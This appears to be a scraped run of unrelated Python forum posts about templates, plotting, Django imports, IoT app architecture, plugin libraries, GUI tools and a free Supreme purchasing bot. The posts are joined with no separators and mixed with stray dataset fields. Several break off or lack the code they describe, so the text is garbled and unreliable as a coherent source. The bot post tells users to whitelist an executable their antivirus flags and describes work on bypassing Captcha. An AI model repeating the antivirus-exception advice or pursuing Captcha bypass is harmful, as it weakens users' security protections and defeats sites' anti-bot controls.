"What does an html template look like in the context of translate toolkit? Does it have to lie in the same folder?

I am using translate tool kit here: http://docs.translatehouse.org/projects/translate-toolkit/en/latest/commands/html2po.html

Managed to get far as to install python and things. I have gotten as far as below, and am unsure how to proceed.

Folder xh has example.po (which has relevant msgids and msgstr) and also example.html (which is blank)

"Hello all!    
So I have a a data set which I want to present in a contour plot. My data set will have values from 0 to 99, but I need to show number 100 as maximum value on the colobar. Below is the code.

What is CSB?

CSB or Community Supreme Bot is a project that has been in development for nearly a year now. Previously known as FESBSC, CSB is a completely free open source bot to cop clothing items from Supreme. Evidently, a market for Supreme bots has developed within the Supreme Community. This market has become saturated with bots that seldom work at prices exceeding hundreds of dollars. The CSB project is an attempt to remove these huge paywalls, allowing all members of the Supreme community a fair chance in copping the items they want without any extra burdens on their wallet. This being said, CSB is still in development and success will never be 100% guaranteed. However, we are constantly working on the bot in order to raise the success rate with ambitious yet capable plans for the future involving new tech which has never been utilised within this field. Currently CSB is being developed by a two man team: me – Tom, also known as HA6Bots and Daniel commonly referred to as Danielyc on forums. We have been working very hard throughout the summer to create a stable and functioning bot in preparation for the fall/winter season 2018. This being said, we are proud to release CSB V3.0. Again, we emphasise that the bot is a work in progress and success is not guaranteed. By downloading and using this tool, you as an individual are responsible for the output whether you successfully purchase your item or not. We accept no responsibility for any mishaps that may occur.

FAQ

How do I use CSB?

We have written up a detailed set of instructions which can be found at csb.center. Included in the download is readme which also contains these instructions.

Are my payment details safe?

Yes. The bot itself (the python scripts) does not connect to any servers. The tool itself is completely client side, payment details (if chosen) are kept on your personal device in an encrypted .cnf file located within your CSB folder directory. The user has the option of saving payment and billing details when prompted to. Again, I repeat this is stored in an encrypted .cnf file which is only accessible via your personal password. Alternatively, the user does not have to save these details and can use the program as normal. The source code is on GitHub at r/https://github.com/danielyc/csb and can be analysed for complete transparency.

How was CSB made?

CSB is made with python. We utilise several libraries in order to make the bot functional. Selenium is used with chromedriver to replicate user interactions with the Supreme website. We use PyQt5 for the UIs. We are planning to replace Selenium and the chromedriver in the near future with our own custom library which will utilise Image recognition technology.

Why is CSB free?

There are several reasons why the CSB project is free:

&#x200B;

1. We want to send      a message to the companies that have been exploiting the Supreme Community      for years with extortionate fees for outdated bots that barely work: This      is not a productive use of technology and is a business model that is      unethical and out-right shady. We want to show that the prices that have      been charged by these companies and individuals are completely artificial –      if two people can create a bot at no other expense then a few hours a day,      why are single use bots going for $200+?
2. The bot is still in development. The bot will always be in      development. This is the nature of bots – things keep getting updated,      Supreme will always push out new changes to their website, so we will need      to make sure the bot is responsive to all these changes. Thus there will      always be an element or risk that the bot will not work. However small      this risk might be, it will always exist and therefore there is always a      chance it will not work. Even if there is a 1% chance that the bot will be      unsuccessful, this means that one out of a hundred people would have      wasted their money. The only solution to this issue is to keep the bot      free.
3. We like Supreme. The bot is a gift to the Supreme Community and      gifts are free.

Will development be sustainable?

Currently CSB is being developed by two people – me (Tom) and Daniel. I will be working full time very soon while Daniel will start university in early September. However this will not stop us from continuing development on the bot. Last year we both had school and still managed to push out the first two versions of the bot. At the moment, apart from time – monetary costs are low. We are planning to further the project with some servers and a website in the near future. We will always keep the bot free for everyone to use. We may at some point look into different avenues for monetization such as advertisements but we will never introduce any paywalls that undermine the functionality and idea behind CSB.

How can I support the CSB project?

Like mentioned before CSB will and always will be free. We will never ask for any money as CSB is a gift to the community. You can support us by telling your friends/fellow Supreme users about CSB and help spread the word that a free and trustworthy bot exists. If you really want to support the project you can donate to our PayPal at r/https://www.paypal.me/supportcsb. We also have a Bitcoin and Ethereum wallet: BTC 32U1WNf47UXcmDuMoJ7vezKd7UGRXmqPFP ETH 0xd445FC2b12B15A0FcA52153a75956bAb843bD03a. We appreciate any donations of any amount. We will also add your name to the donor list in the credits section of the bot unless you say otherwise. The money will help finance any costs involved with the bot such as domains, websites, servers etc.

Will CSB completely automated? Is there anything I have to do manually?

Currently for CSB V3.0 we have not reached full automation. While the bot will automatically find and add the item to the basket as well as filling out all the billing/shipping details, a google Captcha will appear at the end. This is the only process the user manually has to complete. Once the Captcha is completed the purchase will be completed. We are working hard to bypass the Captcha and already have some prototype concepts in production. Please read the instructions located at the bottom of this document for more information.

Chrome and/or my antivirus blocked the file. Is the code malicious?

Much to our frustration, CSB is being flagged by some antivirus software. The code is not malicious in anyway at all and can be viewed within the GitHub. Please add main.exe as an exception with your respective antivirus software and you should be able to run the program.

What is the licencing for CSB?

CSB operates under GNU AGPLv3. You are free to use the tool however you want - as long as it is compliant with the licence.

What OS (Operating Systems) is CSB compatible with?

As of now, windows 7 through 10 and MacOS

Can I help with the production of CSB?

At the moment we are not looking for any new members to join the team. Currently, the project is not big enough for multiple people to work on it without causing greater inconveniences. This being said, you can still help us by emailing us crash reports to info@csb.center or open bugreports on the github page.

How can I get in contact with the CSB team?

You can get in contact with us by emailing [info@csb.center](mailto:info@csb.center)

"Hi folks, relatively new to python! I have a package A that requires dependencies B, C, and D. When I pip install A, it correctly identifies B, C, and D and downloads them. But when it tries to build C, it fails because B wasn't available. If I explicitly pip install B (where B is numpy here) first, it downloads and builds it, then all is well and everything installs fine if I do a ""pip install A"".  

I think all the dependencies are correctly identified in the setup.py install_requires because ""pip install A"" identifies and downloads them.. but before numpy is built it attempts to build dependency C and fails because B isn't yet built/installed. I think I need to force pip to install/build numpy immediately after it's downloaded, but I'm not sure how to do that without explicitly doing it first.

"As every project of non negligeable size I have a `utils` app in my Django project.

In any given file, it is common than the `utils` import represent a good chunk of the imports, things like :

~~~
from apps.utils.time import now_less
from apps.utils.slack import slack_notify
from apps.utils.translate import translation_activate
from apps.utils.decorators import slack
~~~

That's specific to this package as others apps follow the standard django app structure with modules `constants`, `models`, `tasks`, etc.

The importance (=number of imports) given to these helpers functions relatively to others more meaningful imports does not seem fair to me  :)  
So I'm considering using the `utils\__init__.py` as a facade :

~~~
from utils.time import *
from utils.slack import *
from utils.translate import *
from utils.decorators import *
# etc
~~~

thus allowing convenient `from apps.utils import (now_less, slack, slack_notify, translation_activate)` syntax  

Now I know the `import *` is a big no-no but does that seem legit to you in that use-case ?

"I am building a web app that allows users to build data analysis models using a limited set of variables and deploy these models to apply the parameters on IoT streaming data and generate triggers.

I am a computer engineer but I have not done any software engineering/ web development in the past 5 years. Given the myriad options available these days for almost every aspect of web apps, I am feeling trapped with severe analysis paralysis.

The app components are such:
1. A fairly large historical IoT data store for multiple devices and different frequencies (minimum frequency 1 minute going upto daily data for past 5  years) - The only operations that I need on this store are append and selection of a slice of continuous data for a particular time period. Will a nosql database like mongodb or AWS Dynamodb work well enough for this scenario? Database size split across distinct devices would be a maximum of 40 gb. 
2. I need a frontend to let users build analysis models using upto 5 canned variables/ formulas (out of a total 70-80) and enter required inputs for these formulas. For the MVP, I will build this using basic forms and some lightweight and easy to learn javascript framework (recommendations welcome). For version 2.0/3.0 I will maybe evaluate Typeform level interactiveness / pizzazz.  For simple models, I am also evaluating a parser library which parses the user input (in one giant textbox), scans for the syntax and buids python code on the server. Any parsing libraries / lexers which are easy to customize for a particular set of keywords and rules?
3. Once a user builds a model, she can ‘backtest’ the model on historical data to see if the results are promising. This part of the process can take more than 30 seconds to compute and is done in python on the back end. For this I have evaluated AWS lambda functions (for natural concurrency), lambda with frameworks such as Zappa/ chalice, celery queue with rabbitmq/ Redis broker and saving the result in sql/ nosql database and displaying the same to the user front end. Given computation heaviness of the process, what architecture / approach works better? 
4. Once a backtest is satisfactory, user can choose to deploy the model which would mean that for each ‘tick’ of IoT data, formulas (from #2 above) needs to be calculated. Once the signal criteria is hit, user needs to be alerted (email/ sms via twilio or AWS ses). For the scheduled tasks - deployed models, would simple cron scale to running thousands of tasks on a single shared virtual server. Or this is the usecase for AWS lambda? Or should I reuse celery #3.

Users I am expecting - between 100 and 1500 monthly active users primarily active during IoT data streaming hours (6 hours everyday, 5 days a week)

Hosting net expenses - I want to start with no more than $20-30 per month, willing to go up as the proportion of paying users increase. Hence, need easy scalability with zero or as little devops as required. What I have briefly considered are the following:
AWS Elastic Beanstalk, AWS lambda (Zappa), DigitalOcean (vanilla, dokku, nanobox), Heroku (expensive). I need basic deployment features (easy rollbacks) if possible on the starting budget.

We have machines at work we want to monitor. We want to monitor and log when the machine starts and the machine stops.

We have wired the machine ""start"" to pin 17, and the machine ""stop"" to pin 22, so each pin should go ""low"" when the loop is complete/true, and make the log in a CSV file.

They should never be both low at the same time. And once machine start goes low, it needs to wait until machine stop to go low, before it logs machine start again. And it basically just loops between start/stop forever, logging each time it happens. I also added a slight sleep delay as it would log every nanosecond.

"I'm currently implementing a gender module with pronoun data using class variables as each gender type and pronoun. This is what I have so far:

    class Gender:
        class Male:
            NOMINATIVE = ""He""
            OBJECTIVE = ""Him""
        class Female:
            # etc

A male person instance would have a Male Gender type var like this: person.gender = Gender.Male, and from there I can retrieve their correct pronoun based on the pronoun type. 

This works well but it doesn't consider Male and Female as a Gender, so I implemented a solution using Enum that does:

    class Pronoun(Enum):
        NOMINATIVE, OBJECTIVE = range(2)

    class Gender(Enum):
        MALE = {Pronoun.NOMINATIVE: ""He"", Pronoun.OBJECTIVE: ""Him""}
        #FEMALE = etc...

However the pronouns aren't properties of the gender, it needs to use a get() on the enum .value.

The long term goal is to develop a MUD with Python while using Django+Channels as the websocket implementation. I think Channels is not super super new, but there do not seem to be to many implementations of it that I could find. At least not in tutorial form.

I need some help figuring out how to port my tools over. I have quite a number of tools utilizing SQLite.  Then we had a change in policy that no one will have write access to the server anymore.

When I asked about the use of SQLite, I was told that I need to ""*rethink my design.*"" So SQL is out of the question since we are not running any SQL server either.

I've been too upset to tackle this task with a clear mind and I need help please :(  I will probably need to use json.

Here's 1 immediate tool I need to get working. It's a little scheduler that allows a user to book their own workstation in advance to be excluded  or included from render farm on a day by day basis. The interface displays a calendar with white background for neutral, green for including, red for excluding. This same data is read by a CRON job which fires every 15 minutes controlling the farm.  It does other things too but the most important 3 columns all live in the same table.

* date :  int  in YYMMDD format. Works really nicely I can query range of dates, before after or specific date.
* machine name
* state : include or exclude. Machines are considered neutral until they gets added to the table for that specific date.

\- having 1 json per day would be good for the CRON but horrible for user since user needs to see the calendar, there will be lots of looping to get all the data.

\- having 1 json per user  is also horrible for the CRON, again, lots of loop.

"Now you can! With the borg\_pod module / (possibly novel?) design pattern, you can change any class decorated with @assimilate into any other similarly decorated class! How does it do it? All methods with references to self (aside from those methods decorated with @resist) have self converted to self.queen, which is a sort of proxy / bridge for the 'effective' class of the borg pod.

What does it do? It maintains a state between transitions, calls the target class's \_\_new\_\_ and \_\_init\_\_ on conversion, doesn't require matching signatures for \*anything\* (meaning a completely decoupled conversion between otherwise incompatible and isolated classes) , and permits unique instances of pre-bind and post-bind borg pod classes (unlike Singleton) while maintaining a consistent ID between conversion and references to the same pod (unlike the Borg idiom). What that amounts to is that you're able to just add a decorator to your classes and cast between them! Magic methods work, inheritance works, and you can get the package through pip with pip3 install borg\_pod.

Requirements? You're gonna need Python >=3 with this implementation, and there's been no testing done on Python <3.6.  (Submit a pull request and I would be happy to fix any issues for a version of Python I don't use!)

How to use?

Just add @borg\_pod.assimilate above classes you wish to cast between, and you're good! To cast an instance into a new class, you can use YourAssimilatedClass(another\_assimilated\_instance) or pretty much any combination you can think of (queen=another\_assimilated\_instance is the keyword if you want to be explicit) without adjusting your \_\_init\_\_ signature to allow an extra input, as the queen or first instance of a queen class (\_base\_class as a \_\_new\_\_ optional kwarg, default\_class as a wrapper optional kwarg, or just the BorgPod class in borg\_pod) is removed from \*args or \*\*kwargs.

"To start, I have a BA degree with a poor background in math. I've been working at a tech company at service desk. I recently had my first interview loop for python. I've used python on my own for automating tasks, interacting with APIs, and building my own side projects (using flask, sql, plotly, etc.) 

I was feeling confident enough about my own skillset to apply for an entry-level development job at my current company. The first round went reasonably well. The interviewer gave me a programming problem that was like a riddle to solve. 

The second interviewer did the same thing, except it was way more difficult and everything he wrote on the board was in Java - I don't know Java. He was aware of this and I kept having to ask for clarification about what the code was doing and then 'interpret' that into python. I honestly did not understand the question he was asking me -fundamentally. Like, I just didn't understand what he was trying to ask. After the third time I asked him to repeat it I just pretended to understand. He practically walked me through the problem and did it for me. It was awkward 

The third interviewer came in and also asked me some really hard math riddle. It took me about 15 minutes to understand what the problem was actually about. I had no idea where to begin. He also had to essentially walk me through it and ended up writing all of the code on the board. 

I understood the code. We talked about how the functions could work. But he also told me it was kind of a trick question and that the actual answer involved using floats and modulo to get the answer. 

Cool.

The fourth interviewer cancelled on me as I had basically wasted everyone's time at this point. I went home and got very, very drunk.

I feel completely defeated. I've worked for years to learn Python and try and become a developer. I can't afford one of the expensive bootcamps. I thought I knew enough to get at least an ENTRY-LEVEL job based on what I've talked with other developers. The whole interview was essentially how well can you solve riddles using math.

"I'm a student and my main languages are C and C++ but now that I'm seeing how things are simplified in Python I wonder if it can achieve something like this? Pokemon TCG Online is a game that doesn't have any keyboard shortcuts. So my application would scan the screen while PTCGO is open / in the foreground and listen for keystrokes based on context.

For example, depending on which screen you're viewing (collection, deck manager, deck editor etc.), the X button that closes a window sits in a different position, and the same key (probably Esc or backspace/delete) should be assigned to it regardless of where it is. During a match, there is no X button but there is an option to concede the game, which could use the same key as well. Also during a match the cards in your hand are always center-aligned, so every card will change position whenever you draw, play or discard any card — if the number keys are assigned to (x,y) clicks, this needs to be continually corrected for displacement.

Can Python read the screen and interpret such things? Can it listen for keystrokes  (other than terminal input)? Can it move the cursor and click places? I'm not asking for somebody to do all this for me; I'm going to study it and code it but it's nice to know if the tool can do the job, otherwise it's a waste of time.

    class Bar(object):

I code in Python on remote linux box(local repo) with remote repos sitting in BitBucket. 

My development station is Windows with Wing IDE installed.  Their remote development feature is great, however git feature has support with a very limited number of commands

The problem that I run into is when I need to do a git merge or diff,  I have to use the putty session with native cli merge tool. Which is a  pain when you have a lot of conflicts..

I am looking for any pointers for GIT visual edit/Python IDE that  would support remote control of ""local git repo"" on remote linux box..

"I apologize in advance, I'm sure this is going to be rambling and probably missing a lot of pertinent information, but the truth is I'm not even sure all of the questions I need to be asking right now.  You'll be able to tell very quickly that I'm really new to this and just trying to learn.

So, the problem:

My company has an outdated and ineffective database that is used to track customer assets for various forms of service.  We are in the process of having new software built for us, but I was not directly involved in the request, so I am having nightmares that the final product won't even be close to what we need.

The information I'm being given is that it is a VB.NET back-end communicating with a SQL Express server, and a web-based front end (asp.net I think).

With that being said, I foresee a lot of functionality that won't be present, that I would like to implement myself.  Things like utilizing python to modify fields on the server, run reports for the current status of these assets, and automate things like customer reminders.

So the question is: where do I even start?  From a broad perspective, how do these things all work together?  Can I make something like a flask web app to use SQLAlchemy, pandas, and whatever else I need?

Sorry for being so clueless, but if anyone can even point me in the right direction for what libraries I should be using so I can start reading docs and tutorials, I'd appreciate it.

I'm not sure if it's relevant, but when the software is completed I will have access to the source code, I just don't know VB and it seems like an aging language that maybe won't be worth the time investment to learn.",What is the best way to interact with an asset database built in VB?,9azfhw,new

"Yes guys you reddit right. I am working on a new Python framework called: Draper.

​

I want a framework to rapidly develop my applications without installing 100 packages and connecting them together.

Without any migrations stuff like in Django and no database handling like in Flask.

I want to have events when a model changes to bump asynchronous tasks and also store the changes (like an event store but only create, update and delete events).

​

So my first steps are the following:

* Develop CLI to create empty projects of Draper
* Write models and an ODM with a really simple layout like:

​

    class Customer(draper.model):
        name = draper.Field()
        purchases = draper.BelongsToField('Purchase')
    ​
    class Purchase(draper.Model):
       amount = draper.Field()
        customer = draper.HasOneField('Customer')

​

* Automaticly generate a REST-API from that models.
* Use celery to fire asynchronous model events and to do async stuff
* Allow developers to write custom API actions for list or detailed models views
* Create an admin frontend with react and a nice material design for the models (like in django) but also show audit logs

All in one there should be a good place for all the things, so all project layouts for Draper should be like this:

    - models          # all models are stored in here. One model per file or all in one file
    - api             # custom api views are stored in here
    - controller      # application-wide controller are stored here
    - tasks           # all asynchronous tasks should be stored in here
    - main.py         # start the main application with main.py

So the initial mechanism will look for the modules and init models or preparing the tasks

​

**What do you think?**

The features are roughly explained, surely I want to implement all the things very clean and extendable.

Anyone interesting in implementing with me or just have ideas?

"I've been working with plugins for a project and decided to pull that code out and release it as it's own package, [Pluginlib](https://pypi.org/project/pluginlib/). I've been using it for a while and feel like it's in a stable state, but please try it out and let me know what you think.

&#x200B;

Main Features:

* Plugins are validated when they are loaded (instead of when they are used)
* Plugins can be loaded through different mechanisms (modules, filesystem paths, entry points)
* Multiple versions of the same plugin are supported (The newest one is used by default)
* Plugins can be blacklisted by type, name, or version
* Multiple plugin groups are supported so one program can use multiple sets of plugins that won't conflict
* Plugins support conditional loading (examples: os, version, installed software, etc)
* Once loaded, plugins can be accessed through dictionary or dot notation

Links:

* PyPI: [https://pypi.org/project/pluginlib](https://pypi.org/project/pluginlib/)
* GitHub: [https://github.com/Rockhopper-Technologies/pluginlib](https://github.com/Rockhopper-Technologies/pluginlib)
* Read the Docs: [https://pluginlib.readthedocs.io](https://pluginlib.readthedocs.io)

Install:

* pip
   * `pip install pluginlib`
* Fedora
   * `dnf install python2-pluginlib`
   * `dnf install python3-pluginlib`
* EPEL
   * `yum install python-pluginlib`
   * `yum install python34-pluginlib`

&#x200B;

# Step 1: Define plugin parent classes

All plugins are subclasses of parent classes. To create a parent class, use the [@Parent](https://pluginlib.readthedocs.io/en/latest/api.html#pluginlib.Parent) decorator.

The [@Parent](https://pluginlib.readthedocs.io/en/latest/api.html#pluginlib.Parent) decorator can take a plugin type for accessing child plugins of the parent. If a plugin type isn’t given, the class name will be used.

The [@Parent](https://pluginlib.readthedocs.io/en/latest/api.html#pluginlib.Parent) decorator can also take a `group` keyword which restricts plugins to a specific plugin group. `group` should be specified if plugins for different projects could be accessed in an single program, such as with libraries and frameworks. For more information, see the [Plugin Groups](http://pluginlib.readthedocs.io/en/latest/concepts.html#plugin-groups) section.

Methods required in child plugins should be labeled as abstract methods. Plugins without these methods or with parameters that don’t match, will not be loaded. For more information, see the [Abstract Methods](http://pluginlib.readthedocs.io/en/latest/concepts.html#abstract-methods) section.

​

    """"""
    sample.py
    """"""
    import pluginlib
    
    @pluginlib.Parent('parser')
    class Parser(object):
    
        @pluginlib.abstractmethod
        def parse(self, string):
            pass

# 

# Step 2: Define plugin classes

Plugins can be customized through optional class attributes:

>[***\_alias\_***](http://pluginlib.readthedocs.io/en/latest/api.html#pluginlib.Plugin._alias_)  
>  
>Changes the name of the plugin which defaults to the class name.  
>  
>[***\_version\_***](http://pluginlib.readthedocs.io/en/latest/api.html#pluginlib.Plugin._version_)  
>  
>Sets the version of the plugin. Defaults to the module \_\_version\_\_ or None If multiple plugins with the same type and name are loaded, the plugin with the highest version is used. For more information, see the [Versions](http://pluginlib.readthedocs.io/en/latest/concepts.html#versions) section.  
>  
>[***\_skipload\_***](http://pluginlib.readthedocs.io/en/latest/api.html#pluginlib.Plugin._skipload_)  
>  
>Boolean or method specifying if the plugin should not be loaded. This is useful when a plugin is a parent class for additional plugins or when a plugin should only be loaded under certain conditions. For more information see the [Conditional Loading](http://pluginlib.readthedocs.io/en/latest/concepts.html#conditional-loading) section.

        _alias_ = 'json'
    
        def parse(self, string):
            return json.loads(string)

# 

# Step 3: Load Plugins

Plugins are loaded when the module they are in is imported. [PluginLoader](http://pluginlib.readthedocs.io/en/latest/api.html#pluginlib.PluginLoader) will load modules from specified locations and provides access to them.

[***PluginLoader***](http://pluginlib.readthedocs.io/en/latest/api.html#pluginlib.PluginLoader) ***can load plugins from several locations.***

* A program's standard library
* [Entry points](https://packaging.python.org/specifications/entry-points/)
* A list of modules
* A list of filesystem paths

Plugins can also be filtered through blacklists and type filters. See the [Blacklists](http://pluginlib.readthedocs.io/en/latest/concepts.html#blacklists) and [Type Filters](http://pluginlib.readthedocs.io/en/latest/concepts.html#type-filters) sections for more information.

Plugins are accessible through the [PluginLoader.plugins](http://pluginlib.readthedocs.io/en/latest/api.html#pluginlib.PluginLoader.plugins) property, a nested dictionary accessible through dot notation. For other ways to access plugins, see the [Accessing Plugins](http://pluginlib.readthedocs.io/en/latest/concepts.html#accessing-plugins) section.

* National Instruments LabVIEW

I would like to build GUI computational apps. The apps I will create may start small but will find its way with more features in time and will need constant upgrading and deployment. I am always worried about back-compatibility issues. Apps created in Py2.7 may not work in Py3.x or vice versa and so on. But What's more important now is the best possible software I need to stick with to develop apps.

* As you all know, **LabVIEW** is formally the easiest and most straight-forward technique to build GUI Applications and deploy them. But the downside is; it requires very large size drivers that will have to be installed on host PCs. But keep all these factors aside, LabVIEW is pretty much the industry standard to create *Automated Test Systems (ATS)/ Equipment (ATE)*.

* **MATLAB** on the other hand, has a neat App designer and one may purchase the Compiler toolkit ($4250.00 perpetual license) option that will deploy a run-time file along with all dependencies on a host PC that doesn't need any prior MATLAB installations (I have no experience with *MATLAB application builder/Compiler toolkit*). The only reason why I requested a quote for *MATLAB compiler* is; the app designer looks very well furnished, and compiler SDK operation seems straight forward. But the threads (as referenced below) does claim that the app-designer has some limitations.

* **Python** is open source, great community support, and comes with more than one GUI designer tool (*QtDesigner*, Tinkter, etc). I have no experience with developing apps using *Python*. I could not find much references regarding QtDesigner's help manual or tutorials and also its limitations.

"I wrote this implementation of a worker queue in Python for Postgres.  

I wanted a simple job queue without needing all the complexity and moving parts of RabbitMQ or Celery or similar systems.

It works like this:

* there are two tables, one table is a message queue table, the other contains the jobs to be done
* the worker code below grabs a message which contains the id of a job in the jobs table
* some work is done using the data from the job record
* if the work succeeds then the job status is set to complete
* if the work fails, the job status is set to failed, and the jobs 'attempts' field is incremented
* in either case, the queue message has now been processed and is deleted
* if you wanted to re-run failed jobs then you would add a new message back into the queue upon failure (not included in the code below)

"Warning: angry rant incoming

I've been using Python for five years now and it's been awesome. Readable syntax, memorable keywords, easy to set up and install, an amazing community, tons of documentation, a great standard library...

But no damn binary search tree - not without having to resort to some unofficial third-party module, at least.

""But Python doesn't need binary search trees because dictionaries are so blazin' fast!""

That's what some people say when the lack of BSTs are brought up. But that's not a good reason! Yes, dictionaries are awesome. Yes, hash tables are the best choice for most circumstances. No, that does not mean that it is acceptable to exclude major data structures from the standard library when other respectable langauges like C, Java, and C# give you a great pre-made BST right out of the box, no third-party imports required.

Why do I care so much? Because hash tables are really inefficient for sorted data operations. If I have a crapton of data and I want to arbitrarily be able to, say, retrieve the 5 biggest elements or traverse the collection in sorted order or anything of that nature, then I would have to sort the hash table's keys first, which would take O(nlogn) time. And yes, I can keep that sorted list in memory, but what if I add and remove some keys from the dict? Boom, now I have to re-sort the list of keys again. If I have to keep doing this over and over again it can add up to a lot of overhead. Sad!

To me, the optimal solution seems to be a self-balancing binary search tree. But self-balancing binary search trees (or B-trees, similarly) are just way too much work for a lazy dev like me to implement myself. And while I'm fine with using third party modules, it's just embarrassing and frankly terrible that such a common data structure, so essential to the world of computing, is not available in Python out of the box. Once again, nearly every language used for serious development provides this, why doesn't Python?

Maybe there is truly, honestly a very legitimate reason why Python has excluded a binary search tree implementation from its standard library. In that case, I would love to be enlightened - it is my understanding that order operations like ""get the top 5 elements"" or ""traverse the set in order"" are slow on most non-tree structures. AFAIK, Python doesn't provide any low time-complexity data structures for order operations, and while max(), sort(), and the like are really cool, they just aren't enough to make up for a lack of efficient sorting data structures.",Where's Python's damn binary search tree?,9allgh,new

For instance, the Queen frame would use three metal hinges and the Twin frame would use two.  Currently, at the end of the day, I enter the number of beds shipped in the appropriate cell in Excel.  My spreadsheet will them multiply this quantity by the number listed elsewhere in the sheet quantifying how many of these hinges are used per bed frame.  It then spits out the number of these hinges and other parts that are remaining in a second column.

"I have some VBA code that I re-wrote in python. In python it’s an order of magnitude slower. I can’t post the exact code, but its purpose is to generate cash-flows from an excel spreadsheet of data (read into a pandas data frame). For each row a timeframe is looped through, with pandas series being instantiated.

One speedup I thought of is to scrap the series for each row and just use values or tuples. I inherently only need the current and previous value for each property so I think this might be something that would remove a lot of overhead. I wanted the input of other people before I start blindly guessing at what will speed up my code.

The overall flow is as follows:

    x = pd.read_excel(‘file.xlsx’)

    def func(row):

        a = pd.Series(j,k)

        b = pd.Series(j,k)

"**Background:**

​I work for a small regional news organization, and was given the task to create an AI news reporting system that takes hydrocarbon well drilling data and production data, takes a small amount of human input (location to analyze, primarily), and outputs a short story highlighting 2-5 top statistical trends/observations.

​

In terms of what exists out there already, I'm aware of Narratives (and have experimented with the Microsoft PowerBI plugin, with much disappointment in the breadth of information produced), and have looked at Automated Insights (which seemed promising, but costs far too much to use effectively).

​

**The Ask:**

1. Are there any existing Python (or other) projects anyone has seen available open source that extract data trends and observations from a dataset?
2. Are there any existing Python libraries or web API's that use basic AI to change word choice from a formulaic text blurb, so that the exact same story isn't being reported every day?  Ideally, this would be a web API where a story is submitted to, and various possible word choice changes are suggested.
3. **Most Important:** What are some interesting statistics that can be drawn from a list of every oil/gas well drilled in the past decade?  Looking at year-to-year growth, comparing growth between different locations, comparing oil-to-gas growth ratio, etc. are some considerations I've had.  Does anyone have anything else creative?

I'm open to any advice and suggestions anyone can provide, and am excited to see what ideas anyone has!

there are a lot of options when it comes to web scraping. I'm not sure which one is best for this purpose.

from what I've read Scrapy is more of a framework for most webscraping task and seems like overkill unless I'm making one script doing all of the above(rather than one that could gather dates from one page, one from another,and so on, none of which are probably formatted the same.)

beautiful soup seems like it could work, but so could selenium, pupa or a few others that I've came across.

"Hi guys,

I haven’t been posting in this subreddit for a while, but now I want to publish this because of an experiment that we’ve recently made on [CheckiO](https://py.checkio.org/). I think it was a pretty successful one and I hope that the post itself is not going to be banned as a spam or an ad.

First, a little bit of history. For the last couple of years I was teaching Python-basics in my hometown in Ukraine. When we went into such basic subjects as ints, lists, creating functions and so on, I was using CheckiO as a platform for home-work. 

At the same time I’ve always struggled with OOP coding challenges, where a user had to create a specific class. We didn’t have these kinds of missions on CheckiO, and non of the coding-games that I know had them as well, so I simply come up with a series of challenges outside of CheckiO and my students had to share the results by email.

The idea of those challenges is as follows.

In the first mission you need to create a class Warrior, and the instances of that class can fight each other by using the fight function. Then you need to create a class Army, which has different warriors in it. After that you have to create other types of units, such as the defender, vampire and healer. And then you need to create a class Weapon, and so on and so forth.

Eventually, we’ve had a list of 10 missions and we’ve decided to find a way to migrate those missions to CheckiO, and [we did it, along with publishing a series of articles on OOP in Python.](https://py.checkio.org/blog/object-oriented-programming-checkio/)

In another section of the program, it is asking for the chosen class and will automatically assign the max statArray to the Primary Stat, and I believe I know how to make that work. I just don't know how to get the following:

`statArray[i] = sum(diceRolls) - min(diceRolls)`

to be saved to each item in the statArray (stat1, stat2, etc). In the output below, I don't know how to save the final numbers to each statArray, so 13 would go to stat1.

Does anyone have any idea how I can accomplish this? I hope that I worded it clearly enough.

`print(""Stats have been rolled."")`

`statArray = [""stat1"",""stat2"",""stat3"",""stat4"",""stat5"",""stat6""]`

`i = 0`

`while i < len(statGroup):`

`rolls=[1,2,3,4,5,6]`

`diceRolls = np.random.choice(rolls,4, replace=True)`

`diceRolls.sort()`

`print(diceRolls)`

`statArray[i] = sum(diceRolls) - min(diceRolls)`

`## statArray[i] = Stat[i]`

`print(statGroup[i], statArray[i])`

`print(statArray[i])`

`i+=1`

The only reference I could find is this

I am trying to avoid spending time on this if what I am looking is not possible so I thought I would first ask around here if the above is still an option

I am new (zero knowledge) to COM and I would appreciate is someone can point me to some documentation to get me started with Python and Visio

"I am trying to import an HTML table from an html file into Python for further processing.

I also tried using StringIO to read in the entire html file, then I used read\_html read that stream with the same results. I am not sure if the issue is because there are some '$' characters in the text indicating cost, the blank <td></td> are throwing it off, or that some entries have multiple <TD> for notes in the notes column of the source file. The application that outputs this HTML file gives it an XLS extension.

I'd like to see if someone might be able to point me in the right direction to clean up the NaN entries as well as figure out why it seems that some of the data missing. If this info is saved to an Excel file from Python, all I get are header columns that are called Unnamed1-Unnamed13.

It's just a little Django-based app which allows you to browse your filesystem and cast videos to a Chromecast. It's very early stages, but it already works as a proof-of-concept (you can add paths via an admin, browse them and start casting- no pause/stop/seek, it leaks resources, etc.).

It uses the excellent [pychromecast](https://github.com/balloob/pychromecast) to work with the Chromecast, [Gunicorn](http://gunicorn.org/) and [WhiteNoise](http://whitenoise.evans.io/) to serve the media files to the Chromecast. It's incredibly hacky (esp. the ugly way I use Gunicorn and WhiteNoise... need to see if I can come up with something better), but I think it's a nice example of how easily can you glue things together (360 lines of code, currently).

[Dependency Injector](https://github.com/ets-labs/python-dependency-injector) 3.13.1 has been released!

**Changelog**

* Add Python 3.7 support.
* Drop Python 3.3 support.
* Drop Python 2.6 support.
* Add example of “Chained Factories” pattern.
* Add example of “Factory of Factories” pattern.

**""Chained Factories"" pattern**

Main idea of this pattern is about wrapping Factory into other Factory that mix additional arguments or keyword arguments to a wrapped one ([Full example](http://python-dependency-injector.ets-labs.org/examples/chained_factories.html)): 

    database = providers.Factory(SqlAlchemyDatabaseService, session=session)

"Been creating more recipes for the [PySimpleGUI Cookbook](https://pysimplegui.readthedocs.io/en/latest/cookbook/#multiple-columns).

One fun one is the one-line GUI.  It's possible to string together all of the statements in this simple GUI:

This is the code:

    import PySimpleGUI as sg

    layout = [[sg.Text('Filename')],
          [sg.Input(), sg.FileBrowse()],
          [sg.OK(), sg.Cancel()] ]

    button, (number,) = sg.FlexForm('Get filename example').LayoutAndRead(layout)

These all collapse down into a single line (not counting the import of course):

    import PySimpleGUI as sg

    button, (filename,) = sg.FlexForm('Get filename example'). LayoutAndRead([[sg.Text('Filename')], [sg.Input(), sg.FileBrowse()], [sg.OK(), sg.Cancel()] ])

This line of code will display your custom GUI, get the results from the user, and store the result in the user variables `button` and `filename`, ready for use by the program.   Not the most readable code mind you, but if you want compact, it's hard to beat that line for what it does.

